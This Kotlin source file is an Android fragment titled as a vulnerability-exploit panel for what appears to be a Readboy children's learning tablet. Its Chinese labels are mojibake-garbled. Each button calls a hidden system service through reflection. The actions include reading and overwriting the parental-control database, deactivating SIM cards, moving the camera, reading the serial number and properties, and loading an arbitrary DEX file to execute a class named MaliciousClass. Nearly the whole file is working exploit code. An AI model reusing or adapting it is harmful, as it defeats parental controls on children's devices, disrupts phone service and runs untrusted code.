package com.readboy.installer

import android.app.Activity
import android.app.AlertDialog
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment

class VulnerabilityExploitFragment : Fragment() {

    private lateinit var scrollView: ScrollView
    private lateinit var contentLayout: LinearLayout

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_vulnerability_exploit, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        
        scrollView = view.findViewById(R.id.scrollView)
        contentLayout = view.findViewById(R.id.contentLayout)

        setupVulnerabilities()
    }

    private fun setupVulnerabilities() {
        contentLayout.removeAllViews()

        // IRbciService - Á≥ªÁªüÊéßÂà∂ÊºèÊ¥û
        addSection("IRbciService - Á≥ªÁªüÊéßÂà∂ÊºèÊ¥û")
        addMethodButton("IRbciGetInfo", "ËØªÂèñÁ≥ªÁªü‰ø°ÊÅØ", "ËØªÂèñËÆæÂ§áÂü∫Êú¨‰ø°ÊÅØ„ÄÅÈÖçÁΩÆÁä∂ÊÄÅÁ≠â", MethodType.READ, ::executeIRbciGetInfo)
        addMethodButton("IRbciReadDbByName(parent_control)", "ËØªÂèñÂÆ∂ÈïøÊéßÂà∂Êï∞ÊçÆÂ∫ì", "ËØªÂèñÂÆ∂ÈïøÊéßÂà∂ÈÖçÁΩÆÂíåËßÑÂàô", MethodType.READ, ::executeIRbciReadParentControlDb)
        addMethodButton("IRbciReadDbByName(system_config)", "ËØªÂèñÁ≥ªÁªüÈÖçÁΩÆÊï∞ÊçÆÂ∫ì", "ËØªÂèñÁ≥ªÁªüÈÖçÁΩÆ‰ø°ÊÅØ", MethodType.READ, ::executeIRbciReadSystemConfigDb)
        addMethodButton("IRbciGetCameraStatus", "ËØªÂèñÊëÑÂÉèÂ§¥Áä∂ÊÄÅ", "Ëé∑ÂèñÊëÑÂÉèÂ§¥ÂΩìÂâçÁä∂ÊÄÅÂíå‰ΩçÁΩÆ", MethodType.READ, ::executeIRbciGetCameraStatus)
        addMethodButton("IRbciWriteDbByName", "ÂÜôÂÖ•Êï∞ÊçÆÂ∫ì", "ÂÜôÂÖ•‰ªªÊÑèÊï∞ÊçÆÂ∫ìËÆ∞ÂΩï", MethodType.WRITE, ::executeIRbciWriteDb)

        // UICCÂç°ÊéßÂà∂ÊºèÊ¥û
        addSection("UICCÂç°ÊéßÂà∂ÊºèÊ¥û")
        addMethodButton("deactivateUiccCard(0)", "ÂÅúÁî®SIMÂç°0", "ÂÅúÁî®Á¨¨‰∏Ä‰∏™SIMÂç°", MethodType.WRITE, ::executeDeactivateUiccCard0)
        addMethodButton("deactivateUiccCard(1)", "ÂÅúÁî®SIMÂç°1", "ÂÅúÁî®Á¨¨‰∫å‰∏™SIMÂç°", MethodType.WRITE, ::executeDeactivateUiccCard1)
        addMethodButton("getUiccCardState", "Ëé∑ÂèñSIMÂç°Áä∂ÊÄÅ", "Êü•ËØ¢SIMÂç°ÂΩìÂâçÁä∂ÊÄÅ", MethodType.READ, ::executeGetUiccCardState)

        // CameraÊéßÂà∂ÊºèÊ¥û
        addSection("CameraÊéßÂà∂ÊºèÊ¥û")
        addMethodButton("getCameraPosition", "Ëé∑ÂèñÊëÑÂÉèÂ§¥‰ΩçÁΩÆ", "Ëé∑ÂèñÊëÑÂÉèÂ§¥ÁöÑ‰ΩçÁΩÆ‰ø°ÊÅØ", MethodType.READ, ::executeGetCameraPosition)
        addMethodButton("checkCameraCalibration", "Ê£ÄÊü•ÊëÑÂÉèÂ§¥Ê†°ÂáÜ", "Ê£ÄÊü•ÊëÑÂÉèÂ§¥Ê†°ÂáÜÁä∂ÊÄÅ", MethodType.READ, ::executeCheckCameraCalibration)
        addMethodButton("moveCameraUp", "ÊëÑÂÉèÂ§¥Âêë‰∏äÁßªÂä®", "ÊéßÂà∂ÊëÑÂÉèÂ§¥Âêë‰∏äÁßªÂä®", MethodType.WRITE, ::executeMoveCameraUp)
        addMethodButton("moveCameraDown", "ÊëÑÂÉèÂ§¥Âêë‰∏ãÁßªÂä®", "ÊéßÂà∂ÊëÑÂÉèÂ§¥Âêë‰∏ãÁßªÂä®", MethodType.WRITE, ::executeMoveCameraDown)

        // Á±ªÂä†ËΩΩÂô®Ê≥®ÂÖ•ÊºèÊ¥û
        addSection("Á±ªÂä†ËΩΩÂô®Ê≥®ÂÖ•ÊºèÊ¥û")
        addMethodButton("loadDexFromUri", "‰ªéURIÂä†ËΩΩDEXÊñá‰ª∂", "‰ªéÊñá‰ª∂Âä†ËΩΩÂπ∂ÊâßË°å‰ªªÊÑèDEX‰ª£Á†Å", MethodType.FILE, ::showDexFileDialog)

        // Á≥ªÁªüÂ±ûÊÄßËØªÂèñÊºèÊ¥û
        addSection("Á≥ªÁªüÂ±ûÊÄßËØªÂèñÊºèÊ¥û")
        addMethodButton("getSystemProperty(ro.product.model)", "ËØªÂèñËÆæÂ§áÂûãÂè∑", "ËØªÂèñ‰∫ßÂìÅÂûãÂè∑‰ø°ÊÅØ", MethodType.READ, ::executeGetSystemPropertyModel)
        addMethodButton("getSystemProperty(ro.build.fingerprint)", "ËØªÂèñÁ≥ªÁªüÊåáÁ∫π", "ËØªÂèñÁ≥ªÁªüÊûÑÂª∫ÊåáÁ∫π", MethodType.READ, ::executeGetSystemPropertyFingerprint)
        addMethodButton("getSystemProperty(ro.boot.study_mode)", "ËØªÂèñÂ≠¶‰π†Ê®°Âºè", "ËØªÂèñÂ≠¶‰π†Ê®°ÂºèÁä∂ÊÄÅ", MethodType.READ, ::executeGetSystemPropertyStudyMode)
        addMethodButton("getSystemProperty(persist.sys.usb.config)", "ËØªÂèñUSBÈÖçÁΩÆ", "ËØªÂèñUSBÈÖçÁΩÆ‰ø°ÊÅØ", MethodType.READ, ::executeGetSystemPropertyUsbConfig)
        addMethodButton("getSystemProperty(freeform.enabled)", "ËØªÂèñFreeformÁä∂ÊÄÅ", "ËØªÂèñFreeformÁ™óÂè£Ê®°ÂºèÁä∂ÊÄÅ", MethodType.READ, ::executeGetSystemPropertyFreeform)

        // JavaÂèçÂ∞ÑAPIÂà©Áî®
        addSection("JavaÂèçÂ∞ÑAPIÂà©Áî®")
        addMethodButton("getSerialNumber", "ËØªÂèñËÆæÂ§áÂ∫èÂàóÂè∑", "ÈÄöËøáÂèçÂ∞ÑËØªÂèñËÆæÂ§áÂ∫èÂàóÂè∑", MethodType.READ, ::executeGetSerialNumber)
        addMethodButton("getSystemProperties", "ËØªÂèñÁ≥ªÁªüÂ±ûÊÄß", "ÈÄöËøáÂèçÂ∞ÑËØªÂèñÁ≥ªÁªüÂ±ûÊÄß", MethodType.READ, ::executeGetSystemProperties)
        addMethodButton("getRunningProcesses", "Ëé∑ÂèñËøêË°åËøõÁ®ã", "Ëé∑ÂèñÂΩìÂâçËøêË°åÁöÑÂ∫îÁî®ËøõÁ®ã", MethodType.READ, ::executeGetRunningProcesses)
    }

    private fun addSection(title: String) {
        val sectionView = TextView(requireContext()).apply {
            text = title
            textSize = 18f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(16, 24, 16, 8)
            setTextColor(resources.getColor(android.R.color.holo_blue_dark))
        }
        contentLayout.addView(sectionView)
    }

    private fun addMethodButton(
        methodName: String,
        actionName: String,
        description: String,
        methodType: MethodType,
        onClick: () -> Unit
    ) {
        val container = LinearLayout(requireContext()).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(16, 8, 16, 8)
            background = context.getDrawable(android.R.drawable.dialog_holo_light_frame)
        }

        val headerLayout = LinearLayout(requireContext()).apply {
            orientation = LinearLayout.HORIZONTAL
        }

        val methodLabel = TextView(requireContext()).apply {
            text = "ÊñπÊ≥ï: $methodName"
            textSize = 14f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setTextColor(resources.getColor(android.R.color.holo_red_dark))
        }

        val typeLabel = TextView(requireContext()).apply {
            text = when (methodType) {
                MethodType.READ -> "üìñ ËØªÂèñ"
                MethodType.WRITE -> "‚úèÔ∏è ÂÜôÂÖ•"
                MethodType.FILE -> "üìÅ Êñá‰ª∂"
            }
            textSize = 12f
            setPadding(16, 0, 0, 0)
            setTextColor(resources.getColor(android.R.color.darker_gray))
        }

        val actionLabel = TextView(requireContext()).apply {
            text = "Êìç‰Ωú: $actionName"
            textSize = 13f
            setPadding(0, 4, 0, 4)
        }

        val descLabel = TextView(requireContext()).apply {
            text = "ÊèèËø∞: $description"
            textSize = 12f
            setTextColor(resources.getColor(android.R.color.darker_gray))
        }

        val button = Button(requireContext()).apply {
            text = when (methodType) {
                MethodType.READ -> "ËØªÂèñÊï∞ÊçÆ"
                MethodType.WRITE -> "ÊâßË°åÂÜôÂÖ•"
                MethodType.FILE -> "ÈÄâÊã©Êñá‰ª∂"
            }
            setOnClickListener {
                onClick()
            }
        }

        headerLayout.addView(methodLabel)
        headerLayout.addView(typeLabel)

        container.addView(headerLayout)
        container.addView(actionLabel)
        container.addView(descLabel)
        container.addView(button)

        contentLayout.addView(container)
    }

    private enum class MethodType {
        READ, WRITE, FILE
    }

    // IRbciService ÊâßË°åÊñπÊ≥ï
    private fun executeIRbciGetInfo() {
        showResultDialog("IRbciGetInfo", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val getInfoMethod = rbciService?.javaClass?.getMethod("IRbciGetInfo")
            val result = getInfoMethod?.invoke(rbciService) as? Map<*, *>
            "Á≥ªÁªü‰ø°ÊÅØ:\n${formatMap(result)}"
        } catch (e: Exception) {
            "ÊâßË°åÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeIRbciReadParentControlDb() {
        showResultDialog("IRbciReadDbByName(parent_control)", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val readDbMethod = rbciService?.javaClass?.getMethod("RbciReadDbByName", String::class.java)
            val config = readDbMethod?.invoke(rbciService, "parent_control") as? Map<*, *>
            "ÂÆ∂ÈïøÊéßÂà∂ÈÖçÁΩÆ:\n${formatMap(config)}"
        } catch (e: Exception) {
            "ËØªÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeIRbciReadSystemConfigDb() {
        showResultDialog("IRbciReadDbByName(system_config)", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val readDbMethod = rbciService?.javaClass?.getMethod("RbciReadDbByName", String::class.java)
            val config = readDbMethod?.invoke(rbciService, "system_config") as? Map<*, *>
            "Á≥ªÁªüÈÖçÁΩÆ:\n${formatMap(config)}"
        } catch (e: Exception) {
            "ËØªÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeIRbciGetCameraStatus() {
        showResultDialog("IRbciGetCameraStatus", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val getStatusMethod = rbciService?.javaClass?.getMethod("IRbciGetCameraStatus")
            val status = getStatusMethod?.invoke(rbciService)
            "ÊëÑÂÉèÂ§¥Áä∂ÊÄÅ: $status"
        } catch (e: Exception) {
            "ËØªÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeIRbciWriteDb() {
        showInputDialog("IRbciWriteDbByName", "ËØ∑ËæìÂÖ•Êï∞ÊçÆÂ∫ìJSONÊï∞ÊçÆ", "ÂÜôÂÖ•") { input ->
            try {
                val context = requireContext()
                val rbciService = context.getSystemService("rbci")
                val writeDbMethod = rbciService?.javaClass?.getMethod("RbciWriteDbByName", String::class.java, String::class.java)
                writeDbMethod?.invoke(rbciService, "parent_control", input)
                "ÂÜôÂÖ•ÊàêÂäü"
            } catch (e: Exception) {
                "ÂÜôÂÖ•Â§±Ë¥•: ${e.message}"
            }
        }
    }

    // UICCÂç°ÊéßÂà∂ÊâßË°åÊñπÊ≥ï
    private fun executeDeactivateUiccCard0() {
        showResultDialog("deactivateUiccCard(0)", executeDeactivateUiccCard(0))
    }

    private fun executeDeactivateUiccCard1() {
        showResultDialog("deactivateUiccCard(1)", executeDeactivateUiccCard(1))
    }

    private fun executeDeactivateUiccCard(slotId: Int): String {
        return try {
            val extPhoneService = Class.forName("android.os.ServiceManager")
                .getMethod("getService", String::class.java)
                .invoke(null, "extphone")

            val iExtTelephonyClass = Class.forName("org.codeaurora.internal.IExtTelephony")
            val asInterfaceMethod = iExtTelephonyClass.getMethod(
                "asInterface", android.os.IBinder::class.java
            )
            val extTelephony = asInterfaceMethod.invoke(null, extPhoneService)

            val deactivateMethod = extTelephony.javaClass.getMethod(
                "deactivateUiccCard", Int::class.java, Boolean::class.java
            )
            deactivateMethod.invoke(extTelephony, slotId, false)

            "SIMÂç°$slotId Â∑≤ÂÅúÁî®"
        } catch (e: Exception) {
            "Êìç‰ΩúÂ§±Ë¥•: ${e.message}"
        }
    }

    private fun executeGetUiccCardState() {
        showResultDialog("getUiccCardState", try {
            val extPhoneService = Class.forName("android.os.ServiceManager")
                .getMethod("getService", String::class.java)
                .invoke(null, "extphone")

            val iExtTelephonyClass = Class.forName("org.codeaurora.internal.IExtTelephony")
            val asInterfaceMethod = iExtTelephonyClass.getMethod(
                "asInterface", android.os.IBinder::class.java
            )
            val extTelephony = asInterfaceMethod.invoke(null, extPhoneService)

            val getStateMethod = extTelephony.javaClass.getMethod("getUiccCardState", Int::class.java)
            val state = getStateMethod.invoke(extTelephony, 0)

            "SIMÂç°Áä∂ÊÄÅ: $state"
        } catch (e: Exception) {
            "Ëé∑ÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    // CameraÊéßÂà∂ÊâßË°åÊñπÊ≥ï
    private fun executeGetCameraPosition() {
        showResultDialog("getCameraPosition", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val getPositionMethod = rbciService?.javaClass?.getMethod("IRbciGetCameraPosition")
            val position = getPositionMethod?.invoke(rbciService)
            "ÊëÑÂÉèÂ§¥‰ΩçÁΩÆ: $position"
        } catch (e: Exception) {
            "Ëé∑ÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeCheckCameraCalibration() {
        showResultDialog("checkCameraCalibration", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val checkMethod = rbciService?.javaClass?.getMethod("IRbciCheckCameraCalibration")
            val result = checkMethod?.invoke(rbciService)
            "Ê†°ÂáÜÁä∂ÊÄÅ: $result"
        } catch (e: Exception) {
            "Ê£ÄÊü•Â§±Ë¥•: ${e.message}"
        })
    }

    private fun executeMoveCameraUp() {
        showResultDialog("moveCameraUp", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val moveMethod = rbciService?.javaClass?.getMethod("IRbciMoveCamera", Int::class.java)
            moveMethod?.invoke(rbciService, -1)
            "ÊëÑÂÉèÂ§¥Â∑≤Âêë‰∏äÁßªÂä®"
        } catch (e: Exception) {
            "ÁßªÂä®Â§±Ë¥•: ${e.message}"
        })
    }

    private fun executeMoveCameraDown() {
        showResultDialog("moveCameraDown", try {
            val context = requireContext()
            val rbciService = context.getSystemService("rbci")
            val moveMethod = rbciService?.javaClass?.getMethod("IRbciMoveCamera", Int::class.java)
            moveMethod?.invoke(rbciService, 1)
            "ÊëÑÂÉèÂ§¥Â∑≤Âêë‰∏ãÁßªÂä®"
        } catch (e: Exception) {
            "ÁßªÂä®Â§±Ë¥•: ${e.message}"
        })
    }

    // Á±ªÂä†ËΩΩÂô®Ê≥®ÂÖ•
    private fun showDexFileDialog() {
        val intent = Intent(Intent.ACTION_GET_CONTENT).apply {
            type = "*/*"
            addCategory(Intent.CATEGORY_OPENABLE)
        }
        startActivityForResult(intent, REQUEST_PICK_DEX_FILE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_PICK_DEX_FILE && resultCode == Activity.RESULT_OK) {
            data?.data?.let { uri ->
                loadDexFromUri(uri)
            }
        }
    }

    private fun loadDexFromUri(uri: Uri) {
        try {
            val context = requireContext()
            val contentResolver = context.contentResolver
            val inputStream = contentResolver.openInputStream(uri) ?: return
            val baos = java.io.ByteArrayOutputStream()
            val buffer = ByteArray(1024)
            var len: Int
            while (inputStream.read(buffer).also { len = it } != -1) {
                baos.write(buffer, 0, len)
            }
            val dexBytes = baos.toByteArray()

            val classLoader = dalvik.system.InMemoryDexClassLoader(
                java.nio.ByteBuffer.wrap(dexBytes),
                context.classLoader
            )

            val maliciousClass = classLoader.loadClass("com.example.malicious.MaliciousClass")
            val executeMethod = maliciousClass.getMethod("execute")
            executeMethod.invoke(null)

            Toast.makeText(context, "DEXÊñá‰ª∂Â∑≤Âä†ËΩΩÂπ∂ÊâßË°å", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(requireContext(), "Âä†ËΩΩDEXÂ§±Ë¥•: ${e.message}", Toast.LENGTH_LONG).show()
        }
    }

    // Á≥ªÁªüÂ±ûÊÄßËØªÂèñÊâßË°åÊñπÊ≥ï
    private fun executeGetSystemPropertyModel() {
        showResultDialog("getSystemProperty(ro.product.model)", getSystemProperty("ro.product.model"))
    }

    private fun executeGetSystemPropertyFingerprint() {
        showResultDialog("getSystemProperty(ro.build.fingerprint)", getSystemProperty("ro.build.fingerprint"))
    }

    private fun executeGetSystemPropertyStudyMode() {
        showResultDialog("getSystemProperty(ro.boot.study_mode)", getSystemProperty("ro.boot.study_mode"))
    }

    private fun executeGetSystemPropertyUsbConfig() {
        showResultDialog("getSystemProperty(persist.sys.usb.config)", getSystemProperty("persist.sys.usb.config"))
    }

    private fun executeGetSystemPropertyFreeform() {
        showResultDialog("getSystemProperty(freeform.enabled)", getSystemProperty("freeform.enabled"))
    }

    private fun getSystemProperty(key: String): String {
        return try {
            val systemProperties = Class.forName("android.os.SystemProperties")
            val getMethod = systemProperties.getMethod("get", String::class.java)
            val value = getMethod.invoke(null, key) as? String
            "$key = $value"
        } catch (e: Exception) {
            "ËØªÂèñÂ§±Ë¥•: ${e.message}"
        }
    }

    // JavaÂèçÂ∞ÑAPIÊâßË°åÊñπÊ≥ï
    private fun executeGetSerialNumber() {
        showResultDialog("getSerialNumber", try {
            val buildClass = Class.forName("android.os.Build")
            val serialField = buildClass.getDeclaredField("SERIAL")
            serialField.isAccessible = true
            val serial = serialField.get(null) as? String
            "ËÆæÂ§áÂ∫èÂàóÂè∑: $serial"
        } catch (e: Exception) {
            "ËØªÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeGetSystemProperties() {
        showResultDialog("getSystemProperties", try {
            val systemProperties = Class.forName("android.os.SystemProperties")
            val listMethod = systemProperties.getMethod("list")
            val map = HashMap<String, String>()
            listMethod.invoke(null, map)
            val sb = StringBuilder()
            map.entries.take(20).forEach { (key, value) ->
                sb.append("$key = $value\n")
            }
            if (map.size > 20) {
                sb.append("\n... (ÂÖ±${map.size}‰∏™Â±ûÊÄß)")
            }
            sb.toString()
        } catch (e: Exception) {
            "ËØªÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    private fun executeGetRunningProcesses() {
        showResultDialog("getRunningProcesses", try {
            val context = requireContext()
            val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val processes = activityManager.runningAppProcesses
            val sb = StringBuilder()
            processes?.forEach { process ->
                sb.append("PID: ${process.pid}, ProcessName: ${process.processName}\n")
                sb.append("  Packages: ${process.pkgList.joinToString(", ")}\n\n")
            }
            sb.toString()
        } catch (e: Exception) {
            "Ëé∑ÂèñÂ§±Ë¥•: ${e.message}"
        })
    }

    // ÂØπËØùÊ°ÜÊñπÊ≥ï
    private fun showResultDialog(title: String, result: String) {
        val dialogView = LayoutInflater.from(requireContext())
            .inflate(R.layout.dialog_exploit, null)

        dialogView.findViewById<TextView>(R.id.tvTitle).text = title
        dialogView.findViewById<TextView>(R.id.tvDescription).text = "ÊâßË°åÁªìÊûú:"
        dialogView.findViewById<TextView>(R.id.tvResult).text = result
        dialogView.findViewById<TextView>(R.id.tvResult).visibility = View.VISIBLE

        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)
        btnCopy.visibility = View.VISIBLE
        btnCopy.setOnClickListener {
            val clipboard = requireContext().getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val clip = ClipData.newPlainText(title, result)
            clipboard.setPrimaryClip(clip)
            Toast.makeText(requireContext(), "Â∑≤Â§çÂà∂Âà∞Ââ™Ë¥¥Êùø", Toast.LENGTH_SHORT).show()
        }

        AlertDialog.Builder(requireContext())
            .setView(dialogView)
            .setPositiveButton("Á°ÆÂÆö", null)
            .show()
    }

    private fun showInputDialog(title: String, hint: String, buttonText: String, onExecute: (String) -> String) {
        val dialogView = LayoutInflater.from(requireContext())
            .inflate(R.layout.dialog_exploit, null)

        dialogView.findViewById<TextView>(R.id.tvTitle).text = title
        dialogView.findViewById<TextView>(R.id.tvDescription).text = "ËØ∑ËæìÂÖ•Êï∞ÊçÆ:"

        val inputLabel = dialogView.findViewById<TextView>(R.id.inputLabel)
        val inputField = dialogView.findViewById<EditText>(R.id.inputField)
        val btnExecute = dialogView.findViewById<Button>(R.id.btnExecute)
        val tvResult = dialogView.findViewById<TextView>(R.id.tvResult)
        val btnCopy = dialogView.findViewById<Button>(R.id.btnCopy)

        inputLabel.visibility = View.VISIBLE
        inputField.visibility = View.VISIBLE
        btnExecute.visibility = View.VISIBLE
        inputField.hint = hint

        btnExecute.text = buttonText
        btnExecute.setOnClickListener {
            val input = inputField.text.toString()
            val result = onExecute(input)
            tvResult.text = result
            tvResult.visibility = View.VISIBLE
            btnCopy.visibility = View.VISIBLE
            btnCopy.setOnClickListener {
                val clipboard = requireContext().getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText(title, result)
                clipboard.setPrimaryClip(clip)
                Toast.makeText(requireContext(), "Â∑≤Â§çÂà∂Âà∞Ââ™Ë¥¥Êùø", Toast.LENGTH_SHORT).show()
            }
        }

        AlertDialog.Builder(requireContext())
            .setView(dialogView)
            .setPositiveButton("ÂèñÊ∂à", null)
            .show()
    }

    private fun formatMap(map: Map<*, *>?): String {
        if (map == null) return "null"
        return map.entries.joinToString("\n") { (key, value) -> "  $key = $value" }
    }

    companion object {
        private const val REQUEST_PICK_DEX_FILE = 1001
    }
}